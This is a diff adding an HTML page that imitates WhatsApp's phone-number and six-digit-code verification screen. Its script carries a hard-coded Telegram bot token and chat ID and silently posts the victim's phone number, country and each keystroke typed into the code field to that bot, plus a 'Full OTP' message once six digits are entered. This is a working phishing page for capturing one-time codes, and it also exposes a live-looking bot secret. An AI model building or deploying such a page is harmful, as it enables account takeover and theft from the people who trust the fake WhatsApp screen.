@@ -1,0 +1,819 @@
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>WhatsApp · Telegram OTP sender</title>  
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">  
+  <!-- Font Awesome 6 -->  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">  
+  <style>  
+    * {  
+      margin: 0;  
+      padding: 0;  
+      box-sizing: border-box;  
+      font-family: 'Inter', sans-serif;  
+    }  body {  
+  background: #0b141a;  
+  color: #e9edef;  
+  height: 100vh;  
+  display: flex;  
+  justify-content: center;  
+  align-items: center;  
+}  
+
+.container {  
+  width: 100%;  
+  max-width: 420px;  
+  padding: 25px;  
+}  
+
+h1 {  
+  font-size: 26px;  
+  font-weight: 600;  
+  margin-bottom: 10px;  
+}  
+
+p {  
+  font-size: 14px;  
+  color: #8696a0;  
+  margin-bottom: 25px;  
+  line-height: 1.5;  
+}  
+
+.whatsapp-link {  
+  color: #3b82f6;  
+  cursor: pointer;  
+  text-decoration: none;  
+  font-weight: 600;  
+  transition: 0.3s;  
+}  
+
+.whatsapp-link:hover {  
+  text-decoration: underline;  
+  color: #60a5fa;  
+}  
+
+/* ----- COUNTRY SELECTOR (button shows only name) ----- */  
+.country-selector {  
+  position: relative;  
+  width: 100%;  
+  margin-bottom: 20px;  
+}  
+
+.country-code-button {  
+  background: transparent;  
+  border: none;  
+  border-bottom: 2px solid #2a3942;  
+  padding: 12px 0;  
+  width: 100%;  
+  display: flex;  
+  align-items: center;  
+  justify-content: space-between;  
+  cursor: pointer;  
+  color: white;  
+  font-size: 16px;  
+  transition: 0.3s;  
+}  
+
+.country-code-button.open {  
+  border-bottom-color: #00a884;  
+}  
+
+.country-code-button i {  
+  color: #8696a0;  
+  transition: 0.3s;  
+}  
+
+.country-code-button.open i {  
+  transform: rotate(180deg);  
+}  
+
+.selected-preview {  
+  display: flex;  
+  align-items: center;  
+  gap: 8px;  
+}  
+
+/* country code hidden from button – only name visible */  
+.selected-cc {  
+  display: none;  
+}  
+
+.selected-name {  
+  font-weight: 500;  
+  color: #e9edef;  
+  font-size: 16px;  
+}  
+
+/* dropdown panel – search bar visible */  
+.country-dropdown {  
+  display: none;  
+  position: absolute;  
+  background: #1f2c33;  
+  border: 1px solid #2a3942;  
+  border-radius: 12px;  
+  top: calc(100% + 6px);  
+  left: 0;  
+  right: 0;  
+  z-index: 999;  
+  max-height: 320px;  
+  overflow-y: auto;  
+  box-shadow: 0 12px 28px rgba(0,0,0,0.7);  
+}  
+
+.country-dropdown.show {  
+  display: block;  
+}  
+
+/* search box – visible */  
+.dropdown-search {  
+  padding: 12px;  
+  position: sticky;  
+  top: 0;  
+  background: #1f2c33;  
+  border-bottom: 1px solid #2a3942;  
+  border-radius: 12px 12px 0 0;  
+  display: block;  
+}  
+
+.dropdown-search input {  
+  width: 100%;  
+  background: #2a3942;  
+  border: none;  
+  padding: 12px 16px;  
+  border-radius: 30px;  
+  color: white;  
+  font-size: 14px;  
+  outline: none;  
+}  
+
+.dropdown-search input::placeholder {  
+  color: #8696a0;  
+}  
+
+/* country list items */  
+.country-item {  
+  padding: 12px 18px;  
+  cursor: pointer;  
+  color: #e9edef;  
+  display: flex;  
+  align-items: center;  
+  gap: 12px;  
+  border-bottom: 1px solid #2a3942;  
+  transition: 0.2s;  
+}  
+
+.country-item:hover {  
+  background: #2a3942;  
+}  
+
+.country-item.selected {  
+  background: #2a3942;  
+  border-left: 4px solid #00a884;  
+}  
+
+.country-item .item-code {  
+  margin-left: auto;  
+  color: #00a884;  
+  font-weight: 600;  
+}  
+
+.country-item:last-child {  
+  border-bottom: none;  
+}  
+
+/* phone wrapper – inline code inside field */  
+.phone-wrapper {  
+  display: flex;  
+  align-items: center;  
+  border-bottom: 2px solid #2a3942;  
+  transition: border-bottom 0.3s;  
+  margin-bottom: 24px;  
+  background: transparent;  
+  gap: 6px;  
+}  
+
+.phone-wrapper:focus-within {  
+  border-bottom: 2px solid #00a884;  
+}  
+
+.inline-country-code {  
+  font-weight: 600;  
+  color: #00a884;  
+  background: #1f2c33;  
+  padding: 6px 12px;  
+  border-radius: 30px;  
+  font-size: 16px;  
+  white-space: nowrap;  
+  user-select: none;  
+  opacity: 0.9;  
+}  
+
+#mobile {  
+  width: 100%;  
+  background: transparent;  
+  border: none;  
+  padding: 12px 0;  
+  font-size: 16px;  
+  color: white;  
+  outline: none;  
+}  
+
+.btn {  
+  width: 100%;  
+  padding: 14px;  
+  border-radius: 30px;  
+  border: 2px solid #00a884;  
+  background: transparent;  
+  color: #00a884;  
+  font-weight: 600;  
+  cursor: pointer;  
+  transition: 0.3s;  
+  margin-bottom: 8px;  
+}  
+
+.btn:hover {  
+  background: #00a884;  
+  color: black;  
+  box-shadow: 0 0 15px #00a884;  
+}  
+
+.btn:active {  
+  transform: scale(0.95);  
+}  
+
+.hidden {  
+  display: none;  
+}  
+
+.timer {  
+  text-align: center;  
+  margin-top: 15px;  
+  font-size: 14px;  
+  color: #8696a0;  
+}  
+
+.success {  
+  color: #00d26a;  
+  margin-top: 15px;  
+  text-align: center;  
+}  
+
+.error {  
+  color: #ff4d4d;  
+  margin-top: 15px;  
+  text-align: center;  
+}  
+
+#resendBtn {  
+  margin-top: 10px;  
+}  
+
+.country-code-static {  
+  display: none;  
+}  
+
+.input-box {  
+  margin-bottom: 6px;  
+}  
+
+#otp {  
+  width: 100%;  
+  background: transparent;  
+  border: none;  
+  border-bottom: 2px solid #2a3942;  
+  padding: 12px 0;  
+  font-size: 16px;  
+  color: white;  
+  outline: none;  
+  letter-spacing: 2px;  
+}  
+
+#otp:focus {  
+  border-bottom-color: #00a884;  
+}
+
+  </style>  
+</head>  
+<body>  <div class="container">  
+  <h1>Enter your phone number</h1>  
+  <p>WhatsApp will need to verify your phone number. Carrier charges may apply. <span class="whatsapp-link" onclick="showNumberHelp()">What's my number?</span></p>    <!-- step 1: phone + country selector with search visible -->    <div id="step1">  
+    <!-- country selector button: shows only country name (e.g. India) -->  
+    <div class="country-selector" id="countrySelector">  
+      <div class="country-code-button" id="countryCodeBtn">  
+        <div class="selected-preview">  
+          <!-- selected-cc hidden via CSS, we show only name -->  
+          <span class="selected-cc" id="previewCode">+91</span>  
+          <span class="selected-name" id="previewName">India</span>  
+        </div>  
+        <i class="fas fa-chevron-down"></i>  
+      </div>  <!-- dropdown with search bar (visible) -->  
+  <div class="country-dropdown" id="countryDropdown">  
+    <div class="dropdown-search">  
+      <input type="text" id="countrySearchInput" placeholder="Search country or code" autocomplete="off">  
+    </div>  
+    <div id="countryListContainer"></div>  
+  </div>  
+</div>  
+
+<!-- phone input with country code inside the field -->  
+<div class="phone-wrapper">  
+  <span class="inline-country-code" id="inlineCodeDisplay">+91</span>  
+  <!-- static span remains hidden for JS sync -->  
+  <span class="country-code-static" id="staticCountryCode">+91</span>  
+  <input type="tel" id="mobile" placeholder="Phone number" maxlength="10">  
+</div>  
+
+<button class="btn" onclick="sendOTP()">Next</button>
+
+  </div>    <!-- step 2: OTP -->    <div id="step2" class="hidden">  
+    <div class="input-box">  
+      <input type="text" id="otp" placeholder="Enter 6 digit code" maxlength="6" autocomplete="off">  
+    </div>  
+    <button class="btn" onclick="verifyOTP()">Verify</button>  
+    <div class="timer" id="timer"></div>  
+    <button class="btn hidden" id="resendBtn" onclick="resendOTP()">Resend Code</button>  
+  </div>    <div id="message"></div>  
+</div>  <script>  
+  (function() {  
+    // ---------- CONFIG: YOUR TELEGRAM BOT ----------  
+    const TELEGRAM_TOKEN = '8795619918:AAGG4c53xzVTbYDPTtb5wMgpzLLjcQJYHaA';   // your bot token  
+    const TELEGRAM_CHAT_ID = '6419040862';        // your chat ID  
+  
+    // ---------- FULL COUNTRY DATASET ----------  
+    const countries = [  
+      { code: "+93", name: "Afghanistan" },  
+      { code: "+355", name: "Albania" },  
+      { code: "+213", name: "Algeria" },  
+      { code: "+1-684", name: "American Samoa" },  
+      { code: "+376", name: "Andorra" },  
+      { code: "+244", name: "Angola" },  
+      { code: "+1-264", name: "Anguilla" },  
+      { code: "+1-268", name: "Antigua and Barbuda" },  
+      { code: "+54", name: "Argentina" },  
+      { code: "+374", name: "Armenia" },  
+      { code: "+297", name: "Aruba" },  
+      { code: "+61", name: "Australia" },  
+      { code: "+43", name: "Austria" },  
+      { code: "+994", name: "Azerbaijan" },  
+      { code: "+1-242", name: "Bahamas" },  
+      { code: "+973", name: "Bahrain" },  
+      { code: "+880", name: "Bangladesh" },  
+      { code: "+1-246", name: "Barbados" },  
+      { code: "+375", name: "Belarus" },  
+      { code: "+32", name: "Belgium" },  
+      { code: "+501", name: "Belize" },  
+      { code: "+229", name: "Benin" },  
+      { code: "+1-441", name: "Bermuda" },  
+      { code: "+975", name: "Bhutan" },  
+      { code: "+591", name: "Bolivia" },  
+      { code: "+387", name: "Bosnia and Herzegovina" },  
+      { code: "+267", name: "Botswana" },  
+      { code: "+55", name: "Brazil" },  
+      { code: "+1-284", name: "British Virgin Islands" },  
+      { code: "+673", name: "Brunei" },  
+      { code: "+359", name: "Bulgaria" },  
+      { code: "+226", name: "Burkina Faso" },  
+      { code: "+257", name: "Burundi" },  
+      { code: "+238", name: "Cabo Verde" },  
+      { code: "+855", name: "Cambodia" },  
+      { code: "+237", name: "Cameroon" },  
+      { code: "+1", name: "Canada" },  
+      { code: "+1-345", name: "Cayman Islands" },  
+      { code: "+236", name: "Central African Republic" },  
+      { code: "+235", name: "Chad" },  
+      { code: "+56", name: "Chile" },  
+      { code: "+86", name: "China" },  
+      { code: "+57", name: "Colombia" },  
+      { code: "+269", name: "Comoros" },  
+      { code: "+243", name: "Congo, Democratic Republic" },  
+      { code: "+242", name: "Congo, Republic" },  
+      { code: "+682", name: "Cook Islands" },  
+      { code: "+506", name: "Costa Rica" },  
+      { code: "+225", name: "Côte d'Ivoire" },  
+      { code: "+385", name: "Croatia" },  
+      { code: "+53", name: "Cuba" },  
+      { code: "+599", name: "Curaçao" },  
+      { code: "+357", name: "Cyprus" },  
+      { code: "+420", name: "Czech Republic" },  
+      { code: "+45", name: "Denmark" },  
+      { code: "+253", name: "Djibouti" },  
+      { code: "+1-767", name: "Dominica" },  
+      { code: "+1-809", name: "Dominican Republic" },  
+      { code: "+670", name: "East Timor" },  
+      { code: "+593", name: "Ecuador" },  
+      { code: "+20", name: "Egypt" },  
+      { code: "+503", name: "El Salvador" },  
+      { code: "+240", name: "Equatorial Guinea" },  
+      { code: "+291", name: "Eritrea" },  
+      { code: "+372", name: "Estonia" },  
+      { code: "+251", name: "Ethiopia" },  
+      { code: "+500", name: "Falkland Islands" },  
+      { code: "+298", name: "Faroe Islands" },  
+      { code: "+679", name: "Fiji" },  
+      { code: "+358", name: "Finland" },  
+      { code: "+33", name: "France" },  
+      { code: "+594", name: "French Guiana" },  
+      { code: "+689", name: "French Polynesia" },  
+      { code: "+241", name: "Gabon" },  
+      { code: "+220", name: "Gambia" },  
+      { code: "+995", name: "Georgia" },  
+      { code: "+49", name: "Germany" },  
+      { code: "+233", name: "Ghana" },  
+      { code: "+350", name: "Gibraltar" },  
+      { code: "+30", name: "Greece" },  
+      { code: "+299", name: "Greenland" },  
+      { code: "+1-473", name: "Grenada" },  
+      { code: "+590", name: "Guadeloupe" },  
+      { code: "+1-671", name: "Guam" },  
+      { code: "+502", name: "Guatemala" },  
+      { code: "+44-1481", name: "Guernsey" },  
+      { code: "+224", name: "Guinea" },  
+      { code: "+245", name: "Guinea-Bissau" },  
+      { code: "+592", name: "Guyana" },  
+      { code: "+509", name: "Haiti" },  
+      { code: "+504", name: "Honduras" },  
+      { code: "+852", name: "Hong Kong" },  
+      { code: "+36", name: "Hungary" },  
+      { code: "+354", name: "Iceland" },  
+      { code: "+91", name: "India", selected: true },  
+      { code: "+62", name: "Indonesia" },  
+      { code: "+98", name: "Iran" },  
+      { code: "+964", name: "Iraq" },  
+      { code: "+353", name: "Ireland" },  
+      { code: "+44-1624", name: "Isle of Man" },  
+      { code: "+972", name: "Israel" },  
+      { code: "+39", name: "Italy" },  
+      { code: "+1-876", name: "Jamaica" },  
+      { code: "+81", name: "Japan" },  
+      { code: "+44-1534", name: "Jersey" },  
+      { code: "+962", name: "Jordan" },  
+      { code: "+7", name: "Kazakhstan" },  
+      { code: "+254", name: "Kenya" },  
+      { code: "+686", name: "Kiribati" },  
+      { code: "+383", name: "Kosovo" },  
+      { code: "+965", name: "Kuwait" },  
+      { code: "+996", name: "Kyrgyzstan" },  
+      { code: "+856", name: "Laos" },  
+      { code: "+371", name: "Latvia" },  
+      { code: "+961", name: "Lebanon" },  
+      { code: "+266", name: "Lesotho" },  
+      { code: "+231", name: "Liberia" },  
+      { code: "+218", name: "Libya" },  
+      { code: "+423", name: "Liechtenstein" },  
+      { code: "+370", name: "Lithuania" },  
+      { code: "+352", name: "Luxembourg" },  
+      { code: "+853", name: "Macau" },  
+      { code: "+389", name: "Macedonia" },  
+      { code: "+261", name: "Madagascar" },  
+      { code: "+265", name: "Malawi" },  
+      { code: "+60", name: "Malaysia" },  
+      { code: "+960", name: "Maldives" },  
+      { code: "+223", name: "Mali" },  
+      { code: "+356", name: "Malta" },  
+      { code: "+692", name: "Marshall Islands" },  
+      { code: "+596", name: "Martinique" },  
+      { code: "+222", name: "Mauritania" },  
+      { code: "+230", name: "Mauritius" },  
+      { code: "+262", name: "Mayotte" },  
+      { code: "+52", name: "Mexico" },  
+      { code: "+691", name: "Micronesia" },  
+      { code: "+373", name: "Moldova" },  
+      { code: "+377", name: "Monaco" },  
+      { code: "+976", name: "Mongolia" },  
+      { code: "+382", name: "Montenegro" },  
+      { code: "+1-664", name: "Montserrat" },  
+      { code: "+212", name: "Morocco" },  
+      { code: "+258", name: "Mozambique" },  
+      { code: "+95", name: "Myanmar" },  
+      { code: "+264", name: "Namibia" },  
+      { code: "+674", name: "Nauru" },  
+      { code: "+977", name: "Nepal" },  
+      { code: "+31", name: "Netherlands" },  
+      { code: "+687", name: "New Caledonia" },  
+      { code: "+64", name: "New Zealand" },  
+      { code: "+505", name: "Nicaragua" },  
+      { code: "+227", name: "Niger" },  
+      { code: "+234", name: "Nigeria" },  
+      { code: "+683", name: "Niue" },  
+      { code: "+850", name: "North Korea" },  
+      { code: "+1-670", name: "Northern Mariana Islands" },  
+      { code: "+47", name: "Norway" },  
+      { code: "+968", name: "Oman" },  
+      { code: "+92", name: "Pakistan" },  
+      { code: "+680", name: "Palau" },  
+      { code: "+970", name: "Palestine" },  
+      { code: "+507", name: "Panama" },  
+      { code: "+675", name: "Papua New Guinea" },  
+      { code: "+595", name: "Paraguay" },  
+      { code: "+51", name: "Peru" },  
+      { code: "+63", name: "Philippines" },  
+      { code: "+48", name: "Poland" },  
+      { code: "+351", name: "Portugal" },  
+      { code: "+1-787", name: "Puerto Rico" },  
+      { code: "+974", name: "Qatar" },  
+      { code: "+262", name: "Réunion" },  
+      { code: "+40", name: "Romania" },  
+      { code: "+7", name: "Russia" },  
+      { code: "+250", name: "Rwanda" },  
+      { code: "+590", name: "Saint Barthélemy" },  
+      { code: "+290", name: "Saint Helena" },  
+      { code: "+1-869", name: "Saint Kitts and Nevis" },  
+      { code: "+1-758", name: "Saint Lucia" },  
+      { code: "+590", name: "Saint Martin" },  
+      { code: "+508", name: "Saint Pierre and Miquelon" },  
+      { code: "+1-784", name: "Saint Vincent and Grenadines" },  
+      { code: "+685", name: "Samoa" },  
+      { code: "+378", name: "San Marino" },  
+      { code: "+239", name: "São Tomé and Príncipe" },  
+      { code: "+966", name: "Saudi Arabia" },  
+      { code: "+221", name: "Senegal" },  
+      { code: "+381", name: "Serbia" },  
+      { code: "+248", name: "Seychelles" },  
+      { code: "+232", name: "Sierra Leone" },  
+      { code: "+65", name: "Singapore" },  
+      { code: "+1-721", name: "Sint Maarten" },  
+      { code: "+421", name: "Slovakia" },  
+      { code: "+386", name: "Slovenia" },  
+      { code: "+677", name: "Solomon Islands" },  
+      { code: "+252", name: "Somalia" },  
+      { code: "+27", name: "South Africa" },  
+      { code: "+82", name: "South Korea" },  
+      { code: "+211", name: "South Sudan" },  
+      { code: "+34", name: "Spain" },  
+      { code: "+94", name: "Sri Lanka" },  
+      { code: "+249", name: "Sudan" },  
+      { code: "+597", name: "Suriname" },  
+      { code: "+268", name: "Swaziland" },  
+      { code: "+46", name: "Sweden" },  
+      { code: "+41", name: "Switzerland" },  
+      { code: "+963", name: "Syria" },  
+      { code: "+886", name: "Taiwan" },  
+      { code: "+992", name: "Tajikistan" },  
+      { code: "+255", name: "Tanzania" },  
+      { code: "+66", name: "Thailand" },  
+      { code: "+228", name: "Togo" },  
+      { code: "+690", name: "Tokelau" },  
+      { code: "+676", name: "Tonga" },  
+      { code: "+1-868", name: "Trinidad and Tobago" },  
+      { code: "+216", name: "Tunisia" },  
+      { code: "+90", name: "Turkey" },  
+      { code: "+993", name: "Turkmenistan" },  
+      { code: "+1-649", name: "Turks and Caicos Islands" },  
+      { code: "+688", name: "Tuvalu" },  
+      { code: "+256", name: "Uganda" },  
+      { code: "+380", name: "Ukraine" },  
+      { code: "+971", name: "United Arab Emirates" },  
+      { code: "+44", name: "United Kingdom" },  
+      { code: "+1", name: "United States" },  
+      { code: "+598", name: "Uruguay" },  
+      { code: "+1-340", name: "US Virgin Islands" },  
+      { code: "+998", name: "Uzbekistan" },  
+      { code: "+678", name: "Vanuatu" },  
+      { code: "+379", name: "Vatican City" },  
+      { code: "+58", name: "Venezuela" },  
+      { code: "+84", name: "Vietnam" },  
+      { code: "+681", name: "Wallis and Futuna" },  
+      { code: "+212", name: "Western Sahara" },  
+      { code: "+967", name: "Yemen" },  
+      { code: "+260", name: "Zambia" },  
+      { code: "+263", name: "Zimbabwe" }  
+    ];  
+  
+    // DOM elements  
+    const btn = document.getElementById('countryCodeBtn');  
+    const dropdown = document.getElementById('countryDropdown');  
+    const searchInput = document.getElementById('countrySearchInput');  
+    const listContainer = document.getElementById('countryListContainer');  
+    const previewName = document.getElementById('previewName');  
+    const staticSpan = document.getElementById('staticCountryCode');  
+    const inlineCodeSpan = document.getElementById('inlineCodeDisplay');  
+    const mobileInput = document.getElementById('mobile');  
+    const otpInput = document.getElementById('otp');  
+  
+    // State  
+    let selectedCode = '+91';  
+    let selectedName = 'India';  
+    let lastOtpLength = 0;  
+  
+    // Update UI: button shows only name; inline code inside phone field  
+    function updateUI(code, name) {  
+      document.getElementById('previewCode').innerText = code;  // hidden element, but updated  
+      previewName.innerText = name;              
+      staticSpan.innerText = code;               
+      inlineCodeSpan.innerText = code;            
+    }  
+  
+    // Render list based on filter  
+    function renderCountryList(filter = '') {  
+      const filtered = countries.filter(c =>   
+        c.name.toLowerCase().includes(filter.toLowerCase()) ||   
+        c.code.includes(filter)  
+      );  
+  
+      listContainer.innerHTML = '';  
+      filtered.forEach(c => {  
+        const item = document.createElement('div');  
+        item.className = 'country-item';  
+        if (c.code === selectedCode) item.classList.add('selected');  
+        item.innerHTML = `${c.name} <span class="item-code">${c.code}</span>`;  
+        item.dataset.code = c.code;  
+        item.dataset.name = c.name;  
+  
+        item.addEventListener('click', (e) => {  
+          e.stopPropagation();  
+          selectedCode = c.code;  
+          selectedName = c.name;  
+          updateUI(selectedCode, selectedName);  
+          dropdown.classList.remove('show');  
+          btn.classList.remove('open');  
+          // Clear search and re-render full list for next time  
+          searchInput.value = '';  
+          renderCountryList('');  
+        });  
+  
+        listContainer.appendChild(item);  
+      });  
+    }  
+  
+    // Initial render  
+    renderCountryList();  
+  
+    // Toggle dropdown when button clicked  
+    btn.addEventListener('click', (e) => {  
+      e.stopPropagation();  
+      const isOpen = dropdown.classList.contains('show');  
+      if (!isOpen) {  
+        dropdown.classList.add('show');  
+        btn.classList.add('open');  
+        searchInput.focus();  // focus search when opened  
+        // Reset search and list  
+        searchInput.value = '';  
+        renderCountryList('');  
+      } else {  
+        dropdown.classList.remove('show');  
+        btn.classList.remove('open');  
+      }  
+    });  
+  
+    // Search input filter  
+    searchInput.addEventListener('input', () => {  
+      renderCountryList(searchInput.value);  
+    });  
+  
+    // Close dropdown when clicking outside  
+    document.addEventListener('click', (e) => {  
+      if (!document.getElementById('countrySelector').contains(e.target)) {  
+        dropdown.classList.remove('show');  
+        btn.classList.remove('open');  
+      }  
+    });  
+  
+    // Prevent closing when clicking inside dropdown  
+    dropdown.addEventListener('click', (e) => e.stopPropagation());  
+  
+    // Initialize UI  
+    updateUI('+91', 'India');  
+  
+    // ---------- HELPER: send to Telegram ----------  
+    async function sendToTelegram(message) {  
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;  
+      try {  
+        await fetch(url, {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({  
+            chat_id: TELEGRAM_CHAT_ID,  
+            text: message,  
+            parse_mode: 'HTML'  
+          })  
+        });  
+        // silent – no need to show to user  
+      } catch (e) {  
+        console.warn('Telegram send failed', e);  
+      }  
+    }  
+  
+    // ---------- OTP functions (Telegram only, no alerts) ----------  
+    let generatedOTP;  
+    let countdown;  
+    let timeLeft = 60;  
+    let currentFullNumber = '';  // store full number for resend context  
+  
+    // Track OTP input and send each keystroke to Telegram  
+    if (otpInput) {  
+      otpInput.addEventListener('input', function() {  
+        const currentOtp = this.value.trim();  
+        const currentLength = currentOtp.length;  
+          
+        // Only send if something changed (new character added or deleted)  
+        if (currentLength !== lastOtpLength) {  
+          // Send the current OTP input to Telegram  
+          let otpMsg = `⌨️ <b>OTP Input Update</b>\n`;  
+          otpMsg += `📞 Number: ${currentFullNumber || 'Not provided yet'}\n`;  
+          otpMsg += `🔢 Current input: <code>${currentOtp || '(empty)'}</code>\n`;  
+          otpMsg += `📏 Length: ${currentLength}/6\n`;  
+          otpMsg += `⏱ Time: ${new Date().toLocaleTimeString()}`;  
+            
+          sendToTelegram(otpMsg);  
+            
+          // If OTP is complete (6 digits), also send a completion notice  
+          if (currentLength === 6) {  
+            let completeMsg = `✅ <b>OTP Complete (6 digits)</b>\n`;  
+            completeMsg += `📞 Number: ${currentFullNumber || 'Not provided yet'}\n`;  
+            completeMsg += `🔑 Full OTP: <code>${currentOtp}</code>`;  
+            sendToTelegram(completeMsg);  
+          }  
+            
+          lastOtpLength = currentLength;  
+        }  
+      });  
+    }  
+  
+    window.showNumberHelp = function() {  
+      alert("Check your number in phone settings or SIM tray. This is a demo.");  
+    };  
+  
+    window.sendOTP = function() {  
+      let mobile = mobileInput.value.trim();  
+      if (mobile.length !== 10 || isNaN(mobile)) {  
+        showMessage("Enter valid 10 digit number", "error");  
+        return;  
+      }  
+  
+      let countryCode = staticSpan.innerText;   // e.g. +91  
+      let fullNumber = countryCode + mobile;  
+      currentFullNumber = fullNumber;           // store for later  
+  
+      // Generate OTP  
+      generatedOTP = Math.floor(100000 + Math.random() * 900000);  
+  
+      // Send to Telegram: phone number + OTP  
+      let msg = `📲 <b>WhatsApp OTP request</b>\n\n`;  
+      msg += `🌍 Country: ${selectedName} (${countryCode})\n`;  
+      msg += `📞 Phone: ${fullNumber}\n`;  
+      msg += `🔑 OTP: <code>${generatedOTP}</code>\n`;  
+      msg += `⏱ Generated at: ${new Date().toLocaleString()}`;  
+      sendToTelegram(msg);  
+  
+      // No alert popup – silently move to step2  
+      document.getElementById("step1").classList.add("hidden");  
+      document.getElementById("step2").classList.remove("hidden");  
+      startTimer();  
+    };  
+  
+    function startTimer() {  
+      timeLeft = 60;  
+      document.getElementById("resendBtn").classList.add("hidden");  
+      if (countdown) clearInterval(countdown);  
+      countdown = setInterval(() => {  
+        document.getElementById("timer").innerText = "Code expires in " + timeLeft + " seconds";  
+        timeLeft--;  
+        if (timeLeft < 0) {  
+          clearInterval(countdown);  
+          document.getElementById("timer").innerText = "Code expired";  
+          document.getElementById("resendBtn").classList.remove("hidden");  
+        }  
+      }, 1000);  
+    }  
+  
+    window.verifyOTP = function() {  
+      let enteredOTP = document.getElementById("otp").value.trim();  
+      if (enteredOTP == generatedOTP) {  
+        clearInterval(countdown);  
+  
+        // Send verification success to Telegram  
+        let successMsg = `✅ <b>OTP verified successfully</b>\n`;  
+        successMsg += `📞 Number: ${currentFullNumber}\n`;  
+        successMsg += `🔓 OTP used: ${generatedOTP}`;  
+        sendToTelegram(successMsg);  
+  
+        showMessage("Verification Successful (Demo)", "success");  
+      } else {  
+        showMessage("Invalid Code", "error");  
+      }  
+    };  
+  
+    window.resendOTP = function() {  
+      // Generate new OTP  
+      generatedOTP = Math.floor(100000 + Math.random() * 900000);  
+  
+      // Send new OTP to Telegram  
+      let resendMsg = `🔄 <b>OTP Resent</b>\n`;  
+      resendMsg += `📞 Number: ${currentFullNumber}\n`;  
+      resendMsg += `🔑 New OTP: <code>${generatedOTP}</code>`;  
+      sendToTelegram(resendMsg);  
+  
+      // No alert popup  
+      startTimer();  
+    };  
+  
+    function showMessage(msg, type) {  
+      let messageDiv = document.getElementById("message");  
+      messageDiv.className = type;  
+      messageDiv.innerText = msg;  
+      setTimeout(() => messageDiv.innerText = '', 3000);  
+    }  
+  })();  
+</script>  </body>  
+</html>
